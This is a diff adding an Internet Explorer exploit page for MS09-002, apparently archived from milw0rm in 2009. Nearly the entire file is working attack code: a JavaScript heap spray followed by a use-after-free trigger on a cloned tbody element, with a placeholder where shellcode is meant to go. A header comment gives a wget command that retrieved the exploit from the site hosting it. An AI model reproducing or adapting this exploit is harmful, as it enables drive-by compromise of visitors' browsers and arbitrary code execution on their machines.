@@ -1,0 +1,44 @@
+<!--
+MS09-002
+===============================
+grabbed from:
+wget http://www.chengjitj.com/bbs/images/alipay/mm/jc/jc.html --user-agent="MSIE 7.0; Windows NT 5.1"
+
+took a little but found it. /str0ke
+-->
+
+<script language="JavaScript">
+
+var c="putyourshizhere-unescaped";
+
+var array = new Array(); 
+
+var ls = 0x100000-(c.length*2+0x01020); 
+
+var b = unescape("%u0C0C%u0C0C"); 
+while(b.length<ls/2) { b+=b;} 
+var lh = b.substring(0,ls/2); 
+delete b; 
+
+for(i=0; i<0xC0; i++) { 
+	array[i] = lh + c;
+} 
+
+CollectGarbage();
+
+var s1=unescape("%u0b0b%u0b0bAAAAAAAAAAAAAAAAAAAAAAAAA");
+var a1 = new Array();
+for(var x=0;x<1000;x++) a1.push(document.createElement("img"));
+
+function ok() { 
+	o1=document.createElement("tbody"); 
+	o1.click; 
+	var o2 = o1.cloneNode();	
+	o1.clearAttributes(); 
+	o1=null; CollectGarbage(); 
+	for(var x=0;x<a1.length;x++) a1[x].src=s1; 
+	o2.click;
+}
+</script><script>window.setTimeout("ok();",800);</script>
+
+# milw0rm.com [2009-02-18]
